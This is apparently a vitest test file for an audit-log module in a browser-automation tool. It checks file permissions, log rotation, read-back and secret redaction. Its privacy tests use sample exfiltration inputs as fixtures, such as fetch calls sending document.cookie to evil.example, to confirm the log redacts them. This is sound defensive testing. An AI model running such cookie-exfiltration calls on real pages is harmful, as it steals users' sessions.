import { promises as fsp, renameSync, mkdirSync, mkdtempSync, readFileSync, statSync, writeFileSync, existsSync, chmodSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { AuditEntry } from '../../src/types.js';
import { AUDIT_INTENT_MAX, AuditLog, redactUrlsIn, sanitizeEntry, scrubSecrets } from '../../src/safety/audit.js';
import { redactUrl } from '../../src/safety/text.js';

let dir: string;
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'bh-audit-'));
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

const mode = (p: string): number => statSync(p).mode & 0o777;

describe('AuditLog', () => {
  it('creates parent dirs and a 0600 JSONL file with ts', async () => {
    const path = join(dir, 'nested', 'deeper', 'audit.log');
    const log = new AuditLog({ path, now: () => new Date('2026-10-29T12:00:00Z') });
    await log.append({ tool: 'click', outcome: 'ok', element: 'button "Send"' });
    expect(mode(path)).toBe(0o600);
    const lines = readFileSync(path, 'utf8').trim().split('\n');
    expect(lines).toHaveLength(1);
    expect(JSON.parse(lines[0]!)).toEqual({ tool: 'click', outcome: 'ok', element: 'button "Send"', ts: '2026-10-29T12:00:00.000Z' });
  });

  it('tightens permissions on an existing world-readable file', async () => {
    const path = join(dir, 'audit.log');
    writeFileSync(path, '');
    chmodSync(path, 0o644);
    await new AuditLog({ path }).append({ tool: 'x', outcome: 'ok' });
    expect(mode(path)).toBe(0o600);
  });

  it('keeps a caller-supplied ts', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({ tool: 'x', outcome: 'ok', ts: '2020-01-01T00:00:00.000Z' });
    expect((await log.recent(1))[0]!.ts).toBe('2020-01-01T00:00:00.000Z');
  });

  it('drops secret-named keys defensively', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({
      tool: 'type',
      outcome: 'ok',
      args: { text: '[3 chars] "abc"', password: 'hunter2', nested: { otp: '123456', cvv: '999', ok: 1, cardNumber: '4242' }, code: '1', keyCode: 13 },
    });
    // The timestamp is left out: it can end in "999" by chance (a 1-in-1000 flake).
    const raw = readFileSync(path, 'utf8').replace(/"ts":"[^"]*"/g, '');
    for (const s of ['hunter2', '123456', '999', '4242']) expect(raw).not.toContain(s);
    const e = (await log.recent(1))[0]!;
    expect(e.args).toEqual({ text: '[3 chars]', nested: { ok: 1 }, keyCode: 13 });
  });

  it('recent() returns newest first and respects limit', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    for (let i = 0; i < 5; i++) await log.append({ tool: `t${i}`, outcome: 'ok' });
    expect((await log.recent(3)).map((e) => e.tool)).toEqual(['t4', 't3', 't2']);
    expect((await log.recent(100)).map((e) => e.tool)).toEqual(['t4', 't3', 't2', 't1', 't0']);
    expect(await log.recent(0)).toEqual([]);
  });

  it('recent() on a missing file is empty and skips malformed lines', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    expect(await log.recent(5)).toEqual([]);
    writeFileSync(path, '{"tool":"a","outcome":"ok","ts":"1"}\nnot json\n{"no":"ts"}\n{"tool":"b","outcome":"ok","ts":"2"}\n');
    expect((await log.recent(5)).map((e) => e.tool)).toEqual(['b', 'a']);
  });

  it('rotates past maxBytes keeping 3 old files, and recent() spans rotated files', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path, maxBytes: 300 });
    // each line is ~100 bytes → rotate every ~3 entries
    for (let i = 0; i < 30; i++) await log.append({ tool: `tool-${String(i).padStart(2, '0')}`, outcome: 'ok', intent: 'x'.repeat(40) });
    expect(existsSync(`${path}.1`)).toBe(true);
    expect(existsSync(`${path}.2`)).toBe(true);
    expect(existsSync(`${path}.3`)).toBe(true);
    expect(existsSync(`${path}.4`)).toBe(false);
    for (const p of [path, `${path}.1`, `${path}.2`, `${path}.3`]) {
      expect(statSync(p).size).toBeLessThanOrEqual(300);
      expect(mode(p)).toBe(0o600);
    }
    const recent = await log.recent(5);
    expect(recent.map((e) => e.tool)).toEqual(['tool-29', 'tool-28', 'tool-27', 'tool-26', 'tool-25']);
    const curCount = readFileSync(path, 'utf8').trim().split('\n').length;
    expect(curCount).toBeLessThan(5); // so recent(5) really did read rotated files too
  });

  it('concurrent appends are serialized (no lost or interleaved lines across rotation)', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path, maxBytes: 1000, keep: 3 });
    await Promise.all(Array.from({ length: 20 }, (_, i) => log.append({ tool: `c${i}`, outcome: 'ok' })));
    const all = await log.recent(1000);
    // every line must be intact JSON, newest first
    const tools = all.map((e) => e.tool);
    expect(tools[0]).toBe('c19');
    const nums = tools.map((t) => Number(t.slice(1)));
    expect([...nums].sort((a, b) => b - a)).toEqual(nums);
  });
});

describe('A9: mkdir once, size kept in memory', () => {
  afterEach(() => vi.restoreAllMocks());

  it('stats the file once for many appends', async () => {
    const path = join(dir, 'audit.log');
    const stat = vi.spyOn(fsp, 'stat');
    const mkdir = vi.spyOn(fsp, 'mkdir');
    const log = new AuditLog({ path });
    for (let i = 0; i < 5; i++) await log.append({ tool: `t${i}`, outcome: 'ok' });
    expect(stat).toHaveBeenCalledTimes(1);
    expect(mkdir).toHaveBeenCalledTimes(1);
    expect((await log.recent(10)).map((e) => e.tool)).toEqual(['t4', 't3', 't2', 't1', 't0']);
  });

  it('an external delete of the file or the dir loses no entry and keeps 0600', async () => {
    const path = join(dir, 'sub', 'audit.log');
    const log = new AuditLog({ path });
    await log.append({ tool: 'a', outcome: 'ok' });
    rmSync(path);
    await log.append({ tool: 'b', outcome: 'ok' });
    expect(mode(path)).toBe(0o600);
    rmSync(join(dir, 'sub'), { recursive: true, force: true });
    await log.append({ tool: 'c', outcome: 'ok' });
    expect(mode(path)).toBe(0o600);
    expect((await log.recent(10)).map((e) => e.tool)).toEqual(['c']);
  });

  it('a file recreated from outside as 0644 (logrotate create) is 0600 again after the next append', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({ tool: 'a', outcome: 'ok' });
    rmSync(path);
    writeFileSync(path, `${JSON.stringify({ tool: 'old', ts: 't0' })}\n`, { mode: 0o644 });
    chmodSync(path, 0o644);
    expect(mode(path)).toBe(0o644);
    await log.append({ tool: 'b', outcome: 'ok' });
    expect(mode(path)).toBe(0o600);
    expect((await log.recent(10)).map((e) => e.tool)).toEqual(['b', 'old']);
    // Same when the recreated file was left non-empty and its size changed: the in-memory size is not trusted for perms.
    chmodSync(path, 0o644);
    await log.append({ tool: 'c', outcome: 'ok' });
    expect(mode(path)).toBe(0o600);
  });

  it('an external rotate does not make the log rotate a small file early', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path, maxBytes: 300 });
    await log.append({ tool: 'a', outcome: 'ok', intent: 'x'.repeat(150) });
    renameSync(path, `${path}.1`); // e.g. logrotate
    await log.append({ tool: 'b', outcome: 'ok', intent: 'x'.repeat(150) });
    expect(existsSync(`${path}.2`)).toBe(false);
    expect(readFileSync(path, 'utf8').trim().split('\n')).toHaveLength(1);
    expect(mode(path)).toBe(0o600);
    expect((await log.recent(10)).map((e) => e.tool)).toEqual(['b', 'a']);
  });
});

// The recent() algorithm before #202 A1 (whole-file read), kept here as the reference.
function oldRecent(path: string, keep: number, limit: number): AuditEntry[] {
  const n = Math.max(0, Math.floor(limit));
  if (n === 0) return [];
  const out: AuditEntry[] = [];
  const files = [path, ...Array.from({ length: keep }, (_, i) => `${path}.${i + 1}`)];
  for (const file of files) {
    if (!existsSync(file)) continue;
    const lines = readFileSync(file, 'utf8').split('\n');
    for (let i = lines.length - 1; i >= 0 && out.length < n; i--) {
      const l = lines[i]?.trim();
      if (!l) continue;
      try {
        const parsed: unknown = JSON.parse(l);
        if (parsed && typeof parsed === 'object' && typeof (parsed as AuditEntry).ts === 'string') out.push(parsed as AuditEntry);
      } catch {
        /* skip malformed line */
      }
    }
    if (out.length >= n) break;
  }
  return out;
}

describe('A1: recent() reads from the end like the old whole-file read', () => {
  // Small seeded generator so a failure can be replayed.
  let seed = 1;
  const rnd = (k: number): number => {
    seed = (seed * 1103515245 + 12345) % 2147483648;
    return seed % k;
  };
  const pieces = ['a', 'é', '中', '😀', '👩‍👩‍👧', ' ', '"', '\\'];
  const text = (len: number): string => Array.from({ length: len }, () => pieces[rnd(pieces.length)]).join('');
  const line = (i: number): string => {
    const kind = rnd(10);
    if (kind === 0) return '{"tool": "cut'; // truly malformed
    if (kind === 1) return '';
    if (kind === 2) return '{"tool":"no-ts"}';
    if (kind === 3) return `  ${JSON.stringify({ tool: 'pad', ts: `t${i}` })}\r`;
    return JSON.stringify({ tool: 'x', ts: `t${i}`, intent: text(rnd(kind === 9 ? 300 : 20)) });
  };

  it('gives the same result on generated logs (rotated files, emoji, chunk edges, n past the end)', async () => {
    for (let round = 0; round < 40; round++) {
      seed = round + 1;
      const path = join(dir, `r${round}`, 'audit.log');
      const keep = 1 + rnd(3);
      rmSync(dirname(path), { recursive: true, force: true });
      mkdirSync(dirname(path), { recursive: true });
      let total = 0;
      for (const file of [path, ...Array.from({ length: keep }, (_, i) => `${path}.${i + 1}`)]) {
        if (rnd(5) === 0) continue; // a missing file in the chain
        const count = rnd(30);
        total += count;
        const body = Array.from({ length: count }, (_, i) => line(i)).join('\n');
        writeFileSync(file, rnd(2) ? `${body}\n` : body);
      }
      for (const chunk of [1, 2, 3, 5, 7, 16, 64, 1 << 16]) {
        const log = new AuditLog({ path, keep, readChunkBytes: chunk });
        for (const n of [0, 1, 2, 5, total, total + 7]) {
          expect(await log.recent(n), `round ${round} chunk ${chunk} n ${n}`).toEqual(oldRecent(path, keep, n));
        }
      }
    }
  });

  it('a line longer than the chunk and an emoji on a chunk edge come back whole', async () => {
    const path = join(dir, 'audit.log');
    const long = { tool: 'x', ts: 't1', intent: '😀'.repeat(500) };
    writeFileSync(path, `${JSON.stringify(long)}\n${JSON.stringify({ tool: 'y', ts: 't2', intent: 'a😀' })}\n`);
    for (const chunk of [1, 2, 3, 4, 5, 13]) {
      expect(await new AuditLog({ path, readChunkBytes: chunk }).recent(5)).toEqual([{ tool: 'y', ts: 't2', intent: 'a😀' }, long]);
    }
  });
});

describe('scrubSecrets', () => {
  it('handles arrays and depth', () => {
    expect(scrubSecrets([{ password: 'x', a: 1 }])).toEqual([{ a: 1 }]);
    expect(scrubSecrets('plain')).toBe('plain');
    let deep: Record<string, unknown> = { v: 1 };
    for (let i = 0; i < 10; i++) deep = { d: deep };
    expect(JSON.stringify(scrubSecrets(deep))).toContain('[truncated]');
  });
});

describe('R1: audit privacy', () => {
  it('redactUrl keeps origin + capped path, hides query/fragment/credentials', () => {
    expect(redactUrl('https://mail.google.com/mail/u/0/#inbox/FMfcgz')).toBe('https://mail.google.com/mail/u/0/#…');
    expect(redactUrl('https://x.test/reset?token=s3cr3t&u=me')).toBe('https://x.test/reset?…');
    expect(redactUrl('https://user:pw@x.test/a')).toBe('https://x.test/a');
    expect(redactUrl(`https://x.test/${'p'.repeat(200)}`).length).toBeLessThan(110);
    expect(redactUrl('about:blank')).toBe('about:blank');
    expect(redactUrl('javascript:fetch("//e/?"+document.cookie)')).toBe('javascript:…');
    expect(redactUrl('data:text/html,<b>secret</b>')).toBe('data:…');
    expect(redactUrl('not a url')).toBe('[unparsable URL, 9 chars]');
    expect(redactUrl('')).toBe('');
  });

  it('redactUrlsIn rewrites URLs inside free text', () => {
    expect(redactUrlsIn('opened https://evil.example/x?d=secret then left')).toBe('opened https://evil.example/x?… then left');
  });

  it('every entry written is sanitized (server entries too)', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({
      tool: 'navigate',
      outcome: 'ok',
      urlBefore: 'https://mail.google.com/mail/u/0/#inbox/FMfcgzQ',
      urlAfter: 'https://script.google.com/macros/s/X/exec?d=Quarterly+numbers',
      intent: `exfil‮\u0007 to https://evil.example/?d=leak ${'z'.repeat(400)}`,
      element: 'button "Send‮"',
      error: 'failed at https://evil.example/?d=leak',
      args: {
        url: 'https://evil.example/?d=leak',
        expression: 'fetch("https://evil.example/?c="+document.cookie)',
        prompt_text: '[16 chars] "my secret…"',
        text: 'Dear Bob, the wire code is 991122',
        nested: { link: 'see https://evil.example/p?q=leak' },
      },
    });
    const raw = readFileSync(path, 'utf8');
    for (const leak of ['leak', 'Quarterly', 'FMfcgzQ', 'document.cookie', 'my secret', '991122', '‮', '\\u202e', '\\u0007']) {
      expect(raw, leak).not.toContain(leak);
    }
    const e = (await log.recent(1))[0]!;
    expect(e.urlBefore).toBe('https://mail.google.com/mail/u/0/#…');
    expect(e.urlAfter).toBe('https://script.google.com/macros/s/X/exec?…');
    expect([...e.intent!].length).toBeLessThanOrEqual(AUDIT_INTENT_MAX);
    expect(e.args).toMatchObject({
      url: 'https://evil.example/?…',
      expression: expect.stringMatching(/^\[\d+ chars, sha256:[0-9a-f]{12}\]$/),
      prompt_text: '[16 chars]',
      text: '[33 chars]', // length only (review #2 verification: no previews)
      nested: { link: 'see https://evil.example/p?…' },
    });
  });

  it('already-redacted values pass through unchanged', () => {
    const e = sanitizeEntry({
      ts: 't',
      tool: 'type',
      outcome: 'ok',
      args: { text: '[redacted, 7 chars]', expression: '[14 chars, sha256:a37bf3152178]', files: ['/Users/me/a.pdf'] },
    });
    expect(e.args).toEqual({ text: '[redacted, 7 chars]', expression: '[14 chars, sha256:a37bf3152178]', files: ['/Users/me/a.pdf'] });
  });
});

describe('a write that fails after a partial write is never re-appended (post-release review of #226)', () => {
  afterEach(() => vi.restoreAllMocks());

  it('the torn write is not retried: no entry is doubled and the entry before it stays whole', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({ tool: 'before', outcome: 'ok' });
    const realOpen = fsp.open.bind(fsp);
    let tear = true;
    const open = vi.spyOn(fsp, 'open').mockImplementation(async (...args: unknown[]) => {
      const fh = await (realOpen as (...a: unknown[]) => Promise<Awaited<ReturnType<typeof fsp.open>>>)(...args);
      if (tear) {
        tear = false;
        (fh as unknown as { appendFile: (data: string) => Promise<void> }).appendFile = async (data: string) => {
          const buf = Buffer.from(data);
          await fh.write(buf, 0, Math.floor(buf.length / 2)); // half the line reaches the disk ...
          throw Object.assign(new Error('ENOSPC: no space left on device'), { code: 'ENOSPC' }); // ... then the write fails
        };
      }
      return fh;
    });
    await expect(log.append({ tool: 'torn', outcome: 'ok' })).rejects.toThrow('ENOSPC');
    expect(open).toHaveBeenCalledTimes(1); // the failed write is not tried again
    const raw = readFileSync(path, 'utf8');
    expect(raw.split('"tool":"torn"').length - 1).toBe(1); // only the torn fragment, never a second copy
    expect((await log.recent(10)).map((e) => e.tool)).toEqual(['before']);
  });

  it('the next append after a torn write is a whole line of its own and is read back', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({ tool: 'before', outcome: 'ok' });
    const realOpen = fsp.open.bind(fsp);
    let tear = true;
    vi.spyOn(fsp, 'open').mockImplementation(async (...args: unknown[]) => {
      const fh = await (realOpen as (...a: unknown[]) => Promise<Awaited<ReturnType<typeof fsp.open>>>)(...args);
      if (tear) {
        tear = false;
        (fh as unknown as { appendFile: (data: string) => Promise<void> }).appendFile = async (data: string) => {
          const buf = Buffer.from(data);
          await fh.write(buf, 0, Math.floor(buf.length / 2));
          throw Object.assign(new Error('ENOSPC: no space left on device'), { code: 'ENOSPC' });
        };
      }
      return fh;
    });
    await expect(log.append({ tool: 'torn', outcome: 'ok' })).rejects.toThrow('ENOSPC');
    await log.append({ tool: 'after', outcome: 'ok' });
    const lines = readFileSync(path, 'utf8').split('\n');
    expect(lines.filter((l) => l.includes('"tool":"after"'))).toEqual([expect.stringMatching(/^\{"tool":"after".*\}$/)]);
    expect(lines.some((l) => l.includes('"tool":"torn"') && l.includes('"tool":"after"'))).toBe(false);
    expect((await log.recent(10)).map((e) => e.tool)).toEqual(['after', 'before']);
  });
});
